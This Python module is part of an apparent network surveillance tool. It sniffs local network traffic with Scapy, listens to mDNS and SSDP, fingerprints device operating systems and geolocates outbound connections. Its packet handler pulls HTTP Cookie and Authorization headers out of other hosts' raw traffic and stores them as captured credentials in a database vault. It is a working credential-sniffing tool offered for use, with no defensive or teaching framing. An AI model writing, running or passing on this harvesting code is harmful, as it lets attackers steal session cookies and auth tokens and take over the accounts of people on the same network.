import logging
import requests
import socket
import struct
import threading
import time
import re
from datetime import datetime
from typing import Dict, Optional
from scapy.all import sniff, IP, TCP, UDP, DHCP, NBNSQueryRequest, Raw
from radar.database.vault import Vault
from radar.database.models import NetworkDeviceRecord

logger = logging.getLogger("radar.passive")

class PassiveSentinel:
    """
    Passive Intelligence Sentinel.
    Combines mDNS/SSDP listening with deep packet sniffing (DHCP, NetBIOS, OS Fingerprinting, GeoIP).
    """
    
    MDNS_GROUP = "224.0.0.251"
    MDNS_PORT = 5353
    SSDP_GROUP = "239.255.255.250"
    SSDP_PORT = 1900

    def __init__(self, vault: Vault = None):
        self.vault = vault or Vault()
        self.running = False
        self.geoip_cache = {}
        # In-memory cache of identified data to batch updates (used by mDNS/SSDP)
        self.device_cache: Dict[str, Dict] = {}
        
        # Regex for common credentials in raw traffic
        self.cookie_re = re.compile(r"Cookie: (.*?)\r\n", re.IGNORECASE)
        self.auth_re = re.compile(r"Authorization: (.*?)\r\n", re.IGNORECASE)
        self.user_agent_re = re.compile(r"User-Agent: (.*?)\r\n", re.IGNORECASE)

    # ── Multicast Listeners (mDNS / SSDP) ─────────────────────────────────────

    def _setup_multicast_socket(self, group: str, port: int):
        """Creates a socket joined to a multicast group."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', port))
        
        mreq = struct.pack("4sl", socket.inet_aton(group), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(2.0)
        return sock

    def _listen_mdns(self):
        """Passively listens for mDNS packets."""
        try:
            sock = self._setup_multicast_socket(self.MDNS_GROUP, self.MDNS_PORT)
            logger.info("mDNS listener started.")
        except Exception as e:
            logger.error(f"Failed to start mDNS listener: {e}")
            return
        
        while self.running:
            try:
                data, addr = sock.recvfrom(2048)
                ip = addr[0]
                content = data.decode('utf-8', errors='ignore')
                
                if ".local" in content:
                    match = re.search(r"([a-zA-Z0-9\-\_]+)\.local", content)
                    if match:
                        hostname = match.group(1)
                        self._update_device_info(ip, mdns_hostname=hostname)
                
            except socket.timeout:
                continue
            except (StopIteration, KeyboardInterrupt):
                break
            except Exception as e:
                logger.debug(f"mDNS parse error: {e}")

    def _listen_ssdp(self):
        """Passively listens for SSDP NOTIFY messages."""
        try:
            sock = self._setup_multicast_socket(self.SSDP_GROUP, self.SSDP_PORT)
            logger.info("SSDP listener started.")
        except Exception as e:
            logger.error(f"Failed to start SSDP listener: {e}")
            return
        
        while self.running:
            try:
                data, addr = sock.recvfrom(2048)
                ip = addr[0]
                content = data.decode('utf-8', errors='ignore')
                
                if "NOTIFY" in content or "HTTP/1.1 200 OK" in content:
                    info = {}
                    for line in content.splitlines():
                        if ":" in line:
                            parts = line.split(":", 1)
                            if len(parts) == 2:
                                key, val = parts
                                info[key.strip().upper()] = val.strip()
                    
                    details = info.get("SERVER") or info.get("ST") or ""
                    if details:
                        self._update_device_info(ip, ssdp_info=details[:255])
                        
            except socket.timeout:
                continue
            except (StopIteration, KeyboardInterrupt):
                break
            except Exception as e:
                logger.debug(f"SSDP parse error: {e}")

    def _update_device_info(self, ip: str, mdns_hostname: str = None, ssdp_info: str = None):
        """Queues device info for the database."""
        if ip not in self.device_cache:
            self.device_cache[ip] = {}
        
        if mdns_hostname: self.device_cache[ip]['mdns_hostname'] = mdns_hostname
        if ssdp_info: self.device_cache[ip]['ssdp_info'] = ssdp_info

    def get_info(self, ip: str) -> dict:
        """Returns collected passive info for an IP."""
        return self.device_cache.get(ip, {})

    # ── Deep Packet Sniffing (DHCP, NetBIOS, OS-FP, GeoIP) ────────────────────

    def get_geoip(self, ip: str):
        """Simple Geo-IP lookup with caching to avoid rate limits."""
        if ip in self.geoip_cache:
            return self.geoip_cache[ip]
        
        if ip.startswith(("192.168.", "10.", "172.16.", "127.")):
            return "Local Network"

        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
            if r.status_code == 200:
                data = r.json()
                location = f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
                self.geoip_cache[ip] = location
                return location
        except:
            pass
        return "Unknown Location"

    def process_packet(self, pkt):
        """Main packet processor for the Scapy sniffer."""
        if not pkt.haslayer(IP):
            return

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        src_mac = pkt.src.upper()
        ttl = pkt[IP].ttl

        # 1. OS Fingerprinting by TTL (Basic)
        os_guess = "Unknown"
        if ttl > 64 and ttl <= 128:
            os_guess = "Windows"
        elif ttl <= 64:
            os_guess = "Unix-like (Linux/iOS/Android)"

        # 2. Update Basic Device Info
        all_devices = self.vault.get_network_devices()
        device = next((d for d in all_devices if d.mac_address == src_mac), None)
        
        if not device:
            device = NetworkDeviceRecord(
                mac_address=src_mac,
                ip_address=src_ip,
                os_guess=os_guess,
                ttl=ttl,
                first_seen=datetime.now(),
                last_seen=datetime.now()
            )
        else:
            device.ip_address = src_ip
            device.ttl = ttl
            if os_guess != "Unknown":
                device.os_guess = os_guess
            device.last_seen = datetime.now()

        # 3. Hostname Discovery (DHCP)
        if pkt.haslayer(DHCP):
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'hostname':
                    device.device_name = opt[1].decode(errors='ignore')
                    logger.info(f"🏷️  DHCP Name: {src_mac} -> {device.device_name}")

        # 4. NetBIOS Discovery
        if pkt.haslayer(NBNSQueryRequest):
            nb_name = pkt[NBNSQueryRequest].QUESTION_NAME.decode(errors='ignore').strip()
            if nb_name:
                device.device_name = nb_name
                device.os_guess = "Windows"

        # 5. Credential & User-Agent Sniffing
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors='ignore')
            
            ua_match = self.user_agent_re.search(payload)
            if ua_match:
                ua = ua_match.group(1)
                if "iPhone" in ua or "iPad" in ua: device.os_guess = "iOS"
                elif "Android" in ua: device.os_guess = "Android"
                elif "Windows" in ua: device.os_guess = "Windows"
                elif "Macintosh" in ua: device.os_guess = "macOS"

            cookie_match = self.cookie_re.search(payload)
            if cookie_match:
                self.vault.insert_credential(src_ip, dst_ip, "Cookie", cookie_match.group(1), payload[:200])
                logger.warning(f"🍪 Cookie Captured from {src_ip} for {dst_ip}")

            auth_match = self.auth_re.search(payload)
            if auth_match:
                self.vault.insert_credential(src_ip, dst_ip, "Authorization", auth_match.group(1), payload[:200])
                logger.warning(f"🔑 Auth Header Captured from {src_ip}")

        # Save updates
        self.vault.upsert_network_device(device)

        # 6. Geo-IP Tracking for outbound flows
        if not dst_ip.startswith(("192.168.", "10.", "172.16.", "127.")):
            location = self.get_geoip(dst_ip)
            if location != "Unknown Location":
                self.vault.insert_network_flow(datetime.now(), src_ip, dst_ip, pkt[IP].dport, "TCP", f"Geo: {location}", len(pkt))

    def _sniff_loop(self, interface: str):
        """Background thread for Scapy sniffing."""
        logger.info(f"📡 Passive Intelligence Sniffer Active on {interface}")
        try:
            sniff(
                iface=interface, 
                prn=self.process_packet, 
                store=0,
                stop_filter=lambda _: not self.running
            )
        except Exception as e:
            logger.error(f"Passive sniffer crash: {e}")

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    def start(self, interface: str = "wlan0"):
        """Starts all listeners in background threads."""
        if self.running:
            return
        self.running = True
        
        threading.Thread(target=self._listen_mdns, name="mDNS-Listener", daemon=True).start()
        threading.Thread(target=self._listen_ssdp, name="SSDP-Listener", daemon=True).start()
        threading.Thread(target=self._sniff_loop, args=(interface,), name="PassiveSniffer", daemon=True).start()

    def stop(self):
        """Gracefully stops all background threads."""
        self.running = False

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    ps = PassiveSentinel()
    ps.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ps.stop()
